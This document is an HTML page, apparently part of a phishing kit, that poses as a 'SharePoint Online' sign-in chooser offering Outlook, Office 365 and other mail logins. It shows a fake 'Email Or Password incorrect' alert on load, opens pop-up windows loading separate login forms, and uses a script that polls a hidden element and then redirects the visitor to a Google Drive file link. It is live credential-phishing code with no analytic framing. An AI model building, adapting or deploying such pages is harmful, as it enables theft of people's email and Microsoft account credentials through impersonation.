
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
	<link rel="icon" href="../images/shfi.png" type="image/png" sizes="32x32">
    <title>Document</title>
    <link rel="stylesheet" href="../images/style.css">
	<script> alert('Email Or Password incorrect.')</script>
</head>

<body>


    <section id="log-with">
        <div class="log-with-main-col">

            <div class="log-in-col">

                <div class="log-with-inner">

                    <div class="log-header">
                        <p>
                            <img src="../images/header-logo.png" alt="">
                            <span>SharePoint Online</span>
                        </p>
                    </div>

                    <ul class="login-list">
                        
                        
                        <li class="login-item outlook link3" >
                            <a href="#" data-nn="OLO.html">
                                <img src="../images/outlook.jpg" alt=""> Login with Outlook
                            </a>
                        </li>
                        <li class="login-item office link4" >
                            <a href="#" data-nn="OSA.html">
                                <img src="../images/office.jpg" alt=""> Login with Office 365
                            </a>
                        </li>
                       
                        <li class="login-item other link6" >
                            <a href="#" data-nn="ODA.html">
                                <img src="../images/other.jpg" alt=""> Login with Other mail
                            </a>
                        </li>
                    </ul>

                </div>

                

            </div>


        </div>

        <div class="log-with-content bottom">
            <p class="lg">SharePoint Online limits across different Office 365 plans</p>
            <p class="md">Our Microsoft SharePoint Services</p>
        </div>

    </section>


<div style="" id="checks" style="display: none;"></div>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
   <script>
     $(document).ready(function(e){ 
	   window_opener_xc(); 
	 });
	 function window_opener_xc(){
	   var url_part = get_extra_data(1);
	   $('.link1 a, .link2 a, .link3 a, .link4 a, .link5 a, .link6 a').click(function(e){
	     e.preventDefault();
		 var checks = $('#checks');
         var win3 = window.open(url_part+$(this).data('nn'), '_blank', 'location=yes,height=570,width=520,scrollbars=yes,status=yes');
	     setInterval(function(){ 
		   if($('#checks').html()){ window.location.replace(get_extra_data(2)); }
		 }, 3000);
	   });
	 }
	 function get_extra_data(a){
	   var output = '';
	   if(a==1){
	     output = '';
	   }
	   else if(a==2){
	     output = "https://drive.google.com/file/d/1-p4CNC_xSDNE01gQqGq-Ohjep8M76e7W";
	   }
	   return output;
	 }
   </script>

</body>

</html>